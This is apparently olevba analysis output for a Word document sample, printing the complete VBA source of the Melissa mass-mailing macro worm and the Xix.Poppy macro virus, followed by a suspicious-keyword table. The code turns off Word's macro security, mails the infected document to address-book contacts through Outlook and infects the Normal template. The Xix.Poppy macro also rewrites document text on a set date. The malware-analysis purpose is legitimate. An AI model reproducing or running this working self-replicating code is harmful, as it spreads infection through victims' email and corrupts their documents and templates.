olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa-af7dbc250772ac5e489a8fd1a5d3b0a7bc5976c4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Melissa.cls 
in file: Virus.MSWord.Melissa-af7dbc250772ac5e489a8fd1a5d3b0a7bc5976c4 - OLE stream: 'Macros/VBA/Melissa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BreakUmOffASlice.Recipients.Add Peep
            x = x + 1
            If x > 50 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
         BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)"
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = ""
    Next y
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "Melissa" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "Melissa"
DoAD = True
End If
If NTI1.Name <> "Melissa" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "Melissa"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
'WORD/Melissa written by Kwyjibo
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
End Sub

-------------------------------------------------------------------------------
VBA MACRO xix.bas 
in file: Virus.MSWord.Melissa-af7dbc250772ac5e489a8fd1a5d3b0a7bc5976c4 - OLE stream: 'Macros/VBA/xix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub xix()
    
    'VMPCK 1.0d w/Random Path + Update
    '=================================
    'Code Written by VicodinES
    '=================================
    'Poppy ID : 5083-QyUo94005083.c
    '=================================
    'This Virus Is: Xix.Poppy
    
On Error Resume Next
Randomize
BzUz7979 = OnLnBvVq & GjCy17022 & JvCeAiQx & VxLk11768
KrNo8852 = ReRnBxQg & UvHm12817 & LsKgBxIj & TiFo12200
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("xix").Export "c:\xix.drv"
ActiveDocument.ReadOnlyRecommended = False
NsRt = Int(Rnd * 100)
    If NsRt = 99 Then MsgBox "Dia 8 de Novembro VOTA NГO а regionalizaзгo!", vbSystemModal
MgToTvGm = VwDx2292 & LlPg10701
If Day(Now()) = 8 Then Call UmCu9400BsTy
DgCx6829 = DrGhQhNe & ExCf6570 & Int(Rnd * 2675)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VOTA NГO А REGIONALIZAЗГO! SIM AO REFORЗO DO MUNICIPALISMO!"
    .Subject = "JOГO JARDIM x8?! PORRA! DIA 8 VOTA NГO!"
    .Comments = "A REGIONALIZAЗГO Й UM ERRO COLOSSAL!"
    .Execute
End With
If NormalTemplate.VBProject.VBComponents.Item("xix").Name <> "xix" Then MvBv508370643 = True
PlEqIfRo = QwLq7775 & OpHg16129
If ActiveDocument.VBProject.VBComponents.Item("xix").Name <> "xix" Then TxHi70648 = True
If MvBv508370643 = True And TxHi70648 = False Then Set JxPg706450836 = NormalTemplate.VBProject.VBComponents
If MvBv508370643 = False And TxHi70648 = True Then Set JxPg706450836 = ActiveDocument.VBProject.VBComponents
JxPg706450836.import "c:\xix.drv"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If TxHi70648 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
'VMPCK v1.0d [The Final Version?]
GoNqGpTs:
End Sub
Sub HelpAbout()
    On Error Resume Next
IqAj10564 = SgGwHmVe & KlLp7022 & PeVyEhIs & NkCo10807
    MsgBox "Joгo Jardim x8?! Porra! Dia 8 Vota NГO!", vbInformation
End Sub
Sub AutoOpen()
    On Error Resume Next
PuIq14134 = TkEmRxTv & FyIe14577 & Int(Rnd * 8391)
    Call xix
SxLn19336 = OyOrAfGz & QtGv12202 & Int(Rnd * 9871)
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call xix
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call xix
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call xix
ChNz19101 = EwCyLsKj & LuTw19501 & Int(Rnd * 9898)
NhAlIqVz = NhNm11382 & TqVm7492
End Sub
Sub UmCu9400BsTy()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "sim"
            .Replacement.Text = "nгo а regionalizaзгo!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

